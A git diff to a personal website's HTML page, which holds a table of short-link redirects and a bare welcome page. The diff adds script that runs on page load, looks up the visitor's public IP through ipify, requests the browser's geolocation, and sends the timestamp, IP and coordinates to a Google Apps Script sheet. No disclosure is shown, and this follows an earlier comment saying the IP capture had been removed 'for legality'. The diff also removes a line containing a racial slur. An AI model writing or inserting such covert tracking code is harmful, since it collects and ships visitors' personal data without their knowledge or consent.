@@ -37,8 +37,7 @@ const redirects = {
 "/milescurrentdeck": "https://royaleapi.com/deck-list/7232719592950918349",
 "/milescomp": "https://pcpartpicker.com/list/xmww2x",
 "/lethal": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-"/Fried": "friedrich.html",
-"/Nice": "Nice.html"
+"/nice": "nice.html"
 };
 
 if (redirects[path]) {
@@ -49,24 +48,65 @@ window.location.href = redirects[path];
 const SHEET_URL = "https://script.google.com/macros/s/AKfycbxMrkQjLGQlcMUB0bFcx5y5wkDvJKlkgd7uc9I8ojJcI1ibBkiKHf4Dl41Aj2yKJ9y_eQ/exec";
 
 // Function to send data to the Google Sheet
-function sendData(data) {
+function sendData(timestamp, ip, latitude, longitude) {
+    const row = [timestamp, ip, latitude, longitude];
     fetch(SHEET_URL, {
         method: "POST",
-        body: JSON.stringify(data)
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(row)
     })
     .then(res => res.text())
     .then(msg => console.log("Saved to Google Sheets:", msg))
     .catch(err => console.error("Error saving:", err));
 }
 
-// Get IP address first HAD TO BE REMOVED FOR LEGALITYS
+// Fetch public IP address (returns null on failure)
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        if (!res.ok) throw new Error('IP fetch failed');
+        const json = await res.json();
+        return json.ip || null;
+    } catch (e) {
+        console.warn('Could not retrieve IP:', e);
+        return null;
+    }
+}
+
+// Collect tracking data (timestamp, ip, latitude, longitude) and send
+function collectAndSendTracking() {
+    (async () => {
+        const ip = await getIP();
+        const timestamp = new Date().toISOString();
+        let latitude = null;
+        let longitude = null;
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                latitude = pos.coords.latitude;
+                longitude = pos.coords.longitude;
+                sendData(timestamp, ip, latitude, longitude);
+            }, (err) => {
+                // If geolocation denied or fails, send without coords
+                console.warn('Geolocation unavailable:', err);
+                sendData(timestamp, ip, latitude, longitude);
+            }, { timeout: 5000 });
+        } else {
+            sendData(timestamp, ip, latitude, longitude);
+        }
+    })();
+}
+
+// Send tracking data on page load
+collectAndSendTracking();
+
+
 
 </script>
 </head>
 <body>
 <h1>Welcome  </h1>
 <br>
-<p>NIGGER </p>
-<a href="friedrich.html">Friedrice</a>
 </body>
 </html>
+<!DOCTYPE html>
